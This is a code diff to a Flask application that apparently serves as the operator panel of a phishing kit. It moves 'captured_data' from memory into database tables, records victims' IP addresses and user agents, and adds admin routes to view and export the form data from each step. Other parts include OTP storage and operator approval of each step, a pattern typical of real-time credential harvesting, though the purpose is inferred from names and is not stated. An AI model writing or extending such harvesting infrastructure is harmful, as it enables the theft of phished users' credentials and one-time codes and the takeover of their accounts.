@@ -44,6 +44,7 @@ class UserSession(db.Model):
     id = db.Column(db.String(36), primary_key=True)
     session_start = db.Column(db.DateTime, default=datetime.utcnow)
     ip_address = db.Column(db.String(45))
+    user_agent = db.Column(db.Text)
     status = db.Column(db.String(20), default='active')  # active, completed, abandoned
     approved_at = db.Column(db.DateTime)
     approved_by = db.Column(db.String(50))
@@ -104,6 +105,15 @@ otp_codes = {}
 with app.app_context():
     db.create_all()
 
+# Add custom Jinja filter for JSON parsing
+@app.template_filter('from_json')
+def from_json_filter(json_str):
+    """Parse JSON string in templates"""
+    try:
+        return json.loads(json_str) if json_str else {}
+    except:
+        return {}
+
 # Helper functions for admin approval (updated to use database)
 def create_approval_request(session_id, step_name, next_url, user_data=None):
     """Create a new approval request with user data"""
@@ -114,7 +124,8 @@ def create_approval_request(session_id, step_name, next_url, user_data=None):
     if not user_session:
         user_session = UserSession(
             id=session_id,
-            ip_address=request.remote_addr if request else 'Unknown'
+            ip_address=request.remote_addr if request else 'Unknown',
+            user_agent=request.headers.get('User-Agent') if request else 'Unknown'
         )
         db.session.add(user_session)
         db.session.commit()
@@ -157,7 +168,8 @@ def store_user_data(session_id, step_name, data):
     if not user_session:
         user_session = UserSession(
             id=session_id,
-            ip_address=request.remote_addr if request else 'Unknown'
+            ip_address=request.remote_addr if request else 'Unknown',
+            user_agent=request.headers.get('User-Agent') if request else 'Unknown'
         )
         db.session.add(user_session)
         db.session.flush()  # Get the ID without committing
@@ -665,9 +677,12 @@ def admin_view_data(session_id):
     if not session.get('admin_logged_in'):
         return redirect(url_for('admin_login'))
     
-    if session_id in captured_data:
-        data = captured_data[session_id]
-        return render_template('admin_view_data.html', session_id=session_id, data=data)
+    # Get session data from database
+    user_session = UserSession.query.get(session_id)
+    if user_session:
+        return render_template('admin_view_data.html', 
+                             session_id=session_id, 
+                             user_session=user_session)
     else:
         flash('Session data not found', 'error')
         return redirect(url_for('admin_dashboard'))
@@ -678,7 +693,9 @@ def admin_data_history():
     if not session.get('admin_logged_in'):
         return redirect(url_for('admin_login'))
     
-    return render_template('admin_data_history.html', captured_data=captured_data)
+    # Get all user sessions from database
+    user_sessions = UserSession.query.order_by(UserSession.session_start.desc()).all()
+    return render_template('admin_data_history.html', user_sessions=user_sessions)
 
 @app.route('/admin/export-data/<session_id>')
 def admin_export_data(session_id):
@@ -686,23 +703,28 @@ def admin_export_data(session_id):
     if not session.get('admin_logged_in'):
         return jsonify({'error': 'Unauthorized'}), 403
     
-    if session_id in captured_data:
-        data = captured_data[session_id]
-        # Convert datetime objects to strings for JSON serialization
-        export_data = {}
-        for key, value in data.items():
-            if isinstance(value, datetime):
-                export_data[key] = value.isoformat()
-            elif key == 'steps':
-                export_data[key] = {}
-                for step_name, step_data in value.items():
-                    export_data[key][step_name] = {
-                        'timestamp': step_data['timestamp'].isoformat(),
-                        'data': step_data['data'],
-                        'ip_address': step_data.get('ip_address', 'Unknown')
-                    }
-            else:
-                export_data[key] = value
+    # Get session data from database
+    user_session = UserSession.query.get(session_id)
+    if user_session:
+        # Get all auth steps for this session
+        auth_steps = AuthStep.query.filter_by(session_id=session_id).all()
+        
+        # Build export data structure
+        export_data = {
+            'session_id': user_session.id,
+            'session_start': user_session.session_start.isoformat(),
+            'ip_address': user_session.ip_address,
+            'user_agent': user_session.user_agent,
+            'steps': {}
+        }
+        
+        # Add auth steps
+        for step in auth_steps:
+            export_data['steps'][step.step_name] = {
+                'timestamp': step.timestamp.isoformat(),
+                'data': step.form_data,
+                'ip_address': step.ip_address or 'Unknown'
+            }
         
         return jsonify(export_data)
     else:
